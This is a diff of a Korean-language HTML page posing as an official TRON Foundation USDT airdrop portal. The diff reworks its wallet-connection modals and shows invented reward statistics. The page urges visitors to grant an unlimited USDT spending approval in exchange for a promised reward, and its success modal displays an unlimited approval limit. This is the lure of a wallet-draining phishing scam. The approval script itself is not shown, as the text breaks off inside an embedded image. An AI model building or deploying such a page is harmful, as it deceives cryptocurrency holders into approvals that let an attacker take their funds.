@@ -3,47 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT - TRC-20 스페셜 에어드랍 & 권한 승인 포털</title>
+    <title>TRON USDT - TRC-20 에어드랍 & 권한 승인</title>
     <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: { extend: { colors: { dark: '#030712', card: '#0b0f19', border: '#1f293d' } } }
-        }
-    </script>
+    <script>tailwind.config={darkMode:'class',theme:{extend:{colors:{dark:'#030712'}}}}</script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;850&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; }
-        .font-mono { font-family: 'JetBrains Mono', monospace; }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-        .modal-backdrop { display: none; }
-        .modal-backdrop.active { display: flex; }
-        @keyframes pulse-slow { 0%,100%{opacity:.5} 50%{opacity:1} }
-        .animate-pulse-slow { animation: pulse-slow 2.5s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-        .glass-panel { background: linear-gradient(135deg, rgba(15, 23, 42, 0.7) 0%, rgba(7, 11, 20, 0.8) 100%); backdrop-filter: blur(20px); }
+        body{font-family:'Plus Jakarta Sans',sans-serif}
+        .font-mono{font-family:'JetBrains Mono',monospace}
+        .glass{background:linear-gradient(135deg,rgba(15,23,42,0.7),rgba(7,11,20,0.85));backdrop-filter:blur(20px)}
+        .modal-backdrop{display:none}.modal-backdrop.active{display:flex}
+        @keyframes pulse-slow{0%,100%{opacity:.5}50%{opacity:1}}
+        .animate-pulse-slow{animation:pulse-slow 2.5s ease-in-out infinite}
+        .wallet-card{transition:all 0.2s}
+        .wallet-card:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.3)}
+        .wallet-card:active{transform:scale(0.98)}
+        .no-scrollbar::-webkit-scrollbar{display:none}.no-scrollbar{-ms-overflow-style:none;scrollbar-width:none}
     </style>
 </head>
 <body class="bg-[#030712] text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-red-600 selection:text-white">
 
-    <!-- Ambient Background Glows (Red theme) -->
     <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[450px] bg-gradient-to-b from-red-600/10 via-rose-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
     <div class="fixed bottom-0 right-[-100px] w-[500px] h-[500px] bg-emerald-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
-
-    <!-- Toast Container -->
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
 
-    <!-- Live Ticker Bar -->
+    <!-- Ticker -->
     <div class="bg-[#050811] border-b border-slate-800/60 py-2 px-4 text-xs font-mono">
         <div class="max-w-7xl mx-auto flex items-center justify-between gap-4">
-            <div class="flex items-center gap-2.5 text-red-400 shrink-0 font-medium">
-                <span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span></span>
-                <span>실시간 에어드랍 현황</span>
-            </div>
+            <div class="flex items-center gap-2.5 text-red-400 shrink-0 font-medium"><span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span></span><span>실시간 에어드랍 현황</span></div>
             <div id="ticker-container" class="flex items-center gap-6 overflow-x-auto whitespace-nowrap no-scrollbar py-0.5 text-slate-400 text-[11px]"></div>
         </div>
     </div>
@@ -52,114 +42,106 @@
     <header class="border-b border-slate-800/80 bg-[#050811]/90 backdrop-blur-xl sticky top-0 z-40 px-4 lg:px-8 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-3.5">
-                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-red-500/20 to-rose-500/10 border border-red-500/30 flex items-center justify-center shadow-inner text-red-400">
-                    <i class="fa-solid fa-shield-halved text-base"></i>
-                </div>
+                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-red-500/20 to-rose-500/10 border border-red-500/30 flex items-center justify-center shadow-inner text-red-400"><i class="fa-solid fa-shield-halved text-base"></i></div>
                 <div>
-                    <div class="flex items-center gap-2.5">
-                        <h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON USDT <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-rose-300">Portal</span></h1>
-                        <span class="text-[10px] px-2 py-0.5 rounded-full font-mono font-bold bg-red-500/10 text-red-400 border border-red-500/20">TRC-20</span>
-                    </div>
+                    <div class="flex items-center gap-2.5"><h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON USDT <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-rose-300">Portal</span></h1><span class="text-[10px] px-2 py-0.5 rounded-full font-mono font-bold bg-red-500/10 text-red-400 border border-red-500/20">TRC-20</span></div>
                     <p class="text-[11px] text-slate-400 hidden sm:block">공식 TRC-20 온체인 스페셜 에어드랍 & 권한 승인 포털</p>
                 </div>
             </div>
-            <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold text-xs sm:text-sm px-4.5 py-2.5 rounded-xl shadow-lg shadow-red-900/30 transition-all duration-200 border border-red-400/30 active:scale-95">
-                <i class="fa-solid fa-wallet text-red-200"></i><span id="wallet-btn-text">지갑 연결하기</span>
-            </button>
+            <div id="header-wallet-area">
+                <button onclick="showWalletSelector()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-lg shadow-red-900/30 transition-all border border-red-400/30 active:scale-95"><i class="fa-solid fa-wallet text-red-200"></i><span id="wallet-btn-text">지갑 연결하기</span></button>
+            </div>
         </div>
     </header>
 
-    <!-- Mobile DApp Modal -->
-    <div id="mobile-dapp-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass-panel border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh]">
-            <div class="w-16 h-16 mx-auto rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 text-2xl shadow-inner"><i class="fa-solid fa-mobile-screen-button"></i></div>
+    <!-- ===== Wallet Selector Modal ===== -->
+    <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
+        <div class="glass border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh]">
+            <div class="w-16 h-16 mx-auto rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 text-2xl shadow-inner"><i class="fa-solid fa-wallet"></i></div>
             <div class="space-y-2">
-                <h3 class="text-lg font-bold text-white">TronLink 앱에서 열기</h3>
-                <p class="text-xs text-slate-400 leading-relaxed">스마트폰 일반 브라우저에서는 지갑 승인이 불가합니다.<br><strong>TronLink 앱</strong>의 DApp 브라우저를 이용해 주세요.</p>
+                <h3 class="text-lg font-bold text-white">지갑을 선택하세요</h3>
+                <p class="text-xs text-slate-400 leading-relaxed">사용 중인 지갑 앱을 선택하면<br>자동으로 연결 및 승인이 진행됩니다.</p>
             </div>
-            <div class="space-y-2.5 pt-1">
-                <button onclick="launchTronLinkApp()" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold py-3 rounded-xl text-xs flex items-center justify-center gap-2 shadow-lg shadow-red-900/30 transition">
-                    <i class="fa-solid fa-arrow-up-right-from-square"></i><span>TronLink 앱 열기 (URL 자동 복사됨)</span>
+            <div class="space-y-3 pt-2">
+                <!-- TronLink -->
+                <button onclick="launchWallet('tronlink')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left transition">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-red-500/20 to-red-600/10 border border-red-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-bolt text-red-400 text-lg"></i></div>
+                    <div class="flex-1 min-w-0">
+                        <div class="text-sm font-bold text-white">TronLink</div>
+                        <div class="text-[11px] text-slate-400">TRON 공식 지갑 | DApp 브라우저 내장</div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
-                <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
-                    <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i>앱에서 자동으로 안 열리면:</p>
-                    <p>1. TronLink 앱을 직접 여세요</p>
-                    <p>2. 하단 <strong class="text-white">탐색</strong> 탭 클릭</p>
-                    <p>3. 상단 주소창에 <strong class="text-white">붙여넣기</strong> (URL이 이미 복사됨)</p>
-                </div>
-                <a href="https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
-                    <i class="fa-brands fa-google-play text-emerald-400"></i><span>Google Play 설치</span>
-                </a>
-                <a href="https://apps.apple.com/app/tronlink-trx-btt-wallet/id1453530188" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
-                    <i class="fa-brands fa-apple text-blue-400"></i><span>App Store 설치</span>
-                </a>
-                <button onclick="copyCurrentUrl()" class="w-full bg-slate-950/60 border border-slate-800 text-slate-400 hover:text-slate-200 py-2.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition">
-                    <i class="fa-solid fa-copy"></i><span>링크 주소 다시 복사하기</span>
+                <!-- Trust Wallet -->
+                <button onclick="launchWallet('trust')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left transition">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield-halved text-blue-400 text-lg"></i></div>
+                    <div class="flex-1 min-w-0">
+                        <div class="text-sm font-bold text-white">Trust Wallet</div>
+                        <div class="text-[11px] text-slate-400">멀티체인 지갑 | TRON 네트워크 지원</div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
-                <button onclick="document.getElementById('mobile-dapp-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-300 py-2 text-xs transition">닫기</button>
+                <!-- Token Pocket -->
+                <button onclick="launchWallet('tokenpocket')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left transition">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-purple-500/20 to-violet-500/10 border border-purple-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-coins text-purple-400 text-lg"></i></div>
+                    <div class="flex-1 min-w-0">
+                        <div class="text-sm font-bold text-white">Token Pocket</div>
+                        <div class="text-[11px] text-slate-400">아시아 인기 지갑 | TRON DApp 지원</div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+                </button>
             </div>
+            <!-- 수동 안내 -->
+            <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
+                <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i>앱이 자동으로 안 열리면:</p>
+                <p>1. 선택한 지갑 앱을 직접 여세요</p>
+                <p>2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동</p>
+                <p>3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)</p>
+            </div>
+            <button onclick="document.getElementById('wallet-selector-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-300 py-2 text-xs transition">닫기</button>
         </div>
     </div>
 
-    <!-- PC Install Modal -->
-    <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass-panel border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center">
-            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
-            <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-2xl"><i class="fa-solid fa-circle-exclamation"></i></div>
-            <div class="space-y-1.5">
-                <h3 class="text-lg font-bold text-white">TronLink 지갑 미감지</h3>
-                <p class="text-xs text-slate-400">브라우저 확장 프로그램 설치가 필요합니다.</p>
-            </div>
-            <div class="space-y-2.5 pt-2">
-                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg">
-                    <span>TronLink 다운로드 (Chrome)</span><i class="fa-solid fa-arrow-up-right-from-square"></i>
-                </a>
-                <a href="https://www.tronlink.org/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition">
-                    <span>TronLink 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i>
-                </a>
-                <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 hover:text-slate-300 text-xs transition">닫기</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Reward Modal -->
+    <!-- ===== Reward Modal ===== -->
     <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass-panel border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative">
+        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative">
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
-            <div class="space-y-1.5">
-                <h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3>
-                <p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p>
-            </div>
+            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3><p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p></div>
             <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
                 <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">VERIFIED ON-CHAIN</span></div>
                 <div class="flex justify-between text-slate-400"><span>승인 한도:</span><span class="text-white">무제한 (∞ USDT)</span></div>
                 <div class="flex justify-between text-slate-400"><span>TX Hash:</span><span class="text-red-400 truncate max-w-[180px]" id="modal-txhash">-</span></div>
             </div>
-            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
+            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
         </div>
     </div>
 
-    <!-- Main Content -->
+    <!-- PC Install Modal -->
+    <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
+        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center">
+            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-2xl"><i class="fa-solid fa-circle-exclamation"></i></div>
+            <div class="space-y-1.5"><h3 class="text-lg font-bold text-white">지갑 미감지</h3><p class="text-xs text-slate-400">지갑 앱의 DApp 브라우저에서 열어주세요.</p></div>
+            <button onclick="showWalletSelector()" class="w-full py-3 bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs rounded-xl shadow-lg transition">지갑 선택으로 돌아가기</button>
+            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 text-xs transition">닫기</button>
+        </div>
+    </div>
+
+    <!-- Main -->
     <main class="max-w-7xl mx-auto px-4 lg:px-8 py-8 space-y-8 flex-1 w-full">
 
-        <!-- Hero Banner -->
-        <section class="relative rounded-3xl p-6 sm:p-10 overflow-hidden glass-panel border border-slate-800/80 shadow-2xl">
+        <!-- Hero -->
+        <section class="relative rounded-3xl p-6 sm:p-10 overflow-hidden glass border border-slate-800/80 shadow-2xl">
             <div class="absolute top-0 right-0 w-96 h-96 bg-red-600/10 rounded-full blur-3xl pointer-events-none"></div>
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
                 <div class="lg:col-span-7 space-y-5">
-                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold">
-                        <i class="fa-solid fa-sparkles"></i><span>2026 TRON FOUNDATION SPECIAL AIRDROP</span>
-                    </div>
-                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">
-                        TRC-20 USDT<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 via-rose-300 to-amber-300">보상 에어드랍 & 권한 승인</span>
-                    </h2>
-                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">
-                        TronLink 지갑 최초 1회 무제한 권한 승인 완료 시, 스마트 컨트랙트가 잔액 및 보유 자격을 자동 검증하여 즉시 스페셜 USDT 에어드랍 보상을 지급합니다.
-                    </p>
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold"><i class="fa-solid fa-sparkles"></i><span>2026 TRON FOUNDATION SPECIAL AIRDROP</span></div>
+                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">TRC-20 USDT<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 via-rose-300 to-amber-300">보상 에어드랍 & 권한 승인</span></h2>
+                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">지갑 최초 1회 무제한 권한 승인 완료 시, 스마트 컨트랙트가 잔액 및 보유 자격을 자동 검증하여 즉시 스페셜 USDT 에어드랍 보상을 지급합니다.</p>
                     <div class="pt-2 space-y-2 max-w-xl">
                         <div class="flex justify-between text-xs font-semibold"><span class="text-slate-400">총 보상 풀 지급 현황</span><span class="text-red-400 font-mono">1,842,500 / 2,500,000 USDT (73.7%)</span></div>
-                        <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-red-600 via-rose-400 to-amber-400 h-full rounded-full w-[73.7%] shadow-sm"></div></div>
+                        <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-red-600 via-rose-400 to-amber-400 h-full rounded-full w-[73.7%]"></div></div>
                     </div>
                 </div>
                 <div class="lg:col-span-5 bg-[#070b14]/90 border border-slate-800/90 rounded-2xl p-6 backdrop-blur-xl shadow-2xl flex flex-col items-center text-center">
@@ -175,34 +157,24 @@
                         <div class="h-6 w-px bg-slate-800"></div>
                         <div><span class="block text-slate-500 text-[10px]">평균 수령액</span><span class="text-emerald-400 font-bold">280 USDT</span></div>
                     </div>
-                    <!-- QR Code -->
-                    <div class="mt-4 pt-4 border-t border-slate-800/80 w-full flex flex-col items-center">
-                        <div class="bg-white p-2 rounded-xl shadow-lg mb-2">
-                            <img src="data:image/png;base64,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